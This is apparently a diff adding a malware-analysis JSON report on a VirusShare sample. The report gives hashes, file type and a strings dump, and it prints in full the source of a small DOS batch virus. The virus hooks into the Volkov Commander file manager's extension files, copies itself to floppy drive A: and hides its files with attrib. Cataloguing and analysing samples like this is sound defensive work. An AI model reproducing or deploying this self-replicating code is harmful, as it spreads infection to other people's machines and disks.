@@ -1,0 +1,50 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "@echo off\nif not %1==A: goto e\nif not exist c:\\vc\\vc.com goto e\nif exist c:\\vc\\vc.bat goto n\necho  @vc.bat !: !.! V>>c:\\vc\\vcview.ext\necho  @vc.bat !: !.! E>>c:\\vc\\vcedit.ext\necho *: @vc.bat !: !.! R>>c:\\vc\\vc.ext\ntype vc.bat>c:\\vc\\vc.bat\nif not exist c:\\dos\\attrib.* goto n\nattrib +H c:\\vc\\vc.bat\n:n\nif exist %1\\vcview.ext goto e\ntype c:\\vc\\vc.bat>%1\\vc.bat\ntype c:\\vc\\vcview.ext>%1\\vcview.ext      \ntype c:\\vc\\vcedit.ext>%1\\vcedit.ext\ntype c:\\vc\\vc.ext>%1\\vc.ext\nif not exist c:\\dos\\attrib.* goto e\nattrib +H %1\\vc*.* \n:e\nif not %3==R goto d\n[Joy2] Original idea by Reminder\n:d"
+    },
+    "filename": "VirusShare_25019c1c00b2a15a7ab264616ebf90cf",
+    "filesize": 600,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "25019c1c00b2a15a7ab264616ebf90cf",
+        "sha1": "118f7cce318fda49f86fa23db60c740d7ebcf225",
+        "sha256": "73dc28e4ea49302aacef435f2c179ef92f403ec06044a83054319d6c730f528d"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "if not %1==A: goto e",
+            "if not exist c:\\vc\\vc.com goto e",
+            "if exist c:\\vc\\vc.bat goto n",
+            "echo  @vc.bat !: !.! V>>c:\\vc\\vcview.ext",
+            "echo  @vc.bat !: !.! E>>c:\\vc\\vcedit.ext",
+            "echo *: @vc.bat !: !.! R>>c:\\vc\\vc.ext",
+            "type vc.bat>c:\\vc\\vc.bat",
+            "if not exist c:\\dos\\attrib.* goto n",
+            "attrib +H c:\\vc\\vc.bat",
+            "if exist %1\\vcview.ext goto e",
+            "type c:\\vc\\vc.bat>%1\\vc.bat",
+            "type c:\\vc\\vcview.ext>%1\\vcview.ext      ",
+            "type c:\\vc\\vcedit.ext>%1\\vcedit.ext",
+            "type c:\\vc\\vc.ext>%1\\vc.ext",
+            "if not exist c:\\dos\\attrib.* goto e",
+            "attrib +H %1\\vc*.* ",
+            "if not %3==R goto d",
+            "[Joy2] Original idea by Reminder"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.262406",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
